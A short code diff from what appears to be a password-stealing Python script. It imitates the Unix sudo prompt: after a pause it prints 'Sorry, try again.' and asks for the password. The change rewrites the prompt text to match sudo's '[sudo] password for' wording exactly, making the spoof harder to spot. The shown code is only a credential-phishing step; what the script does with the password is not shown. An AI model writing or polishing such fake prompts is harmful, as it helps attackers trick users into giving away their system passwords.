@@ -24,7 +24,7 @@ def getUSER():
 def getPASS(USER):
 	time.sleep(2)
 	print("Sorry, try again.")
-	PASS = getpass.getpass(prompt="password for " + USER + ": ")
+	PASS = getpass.getpass(prompt=r"[sudo] password for " + USER + ": ")
 	return PASS.strip()
 
 
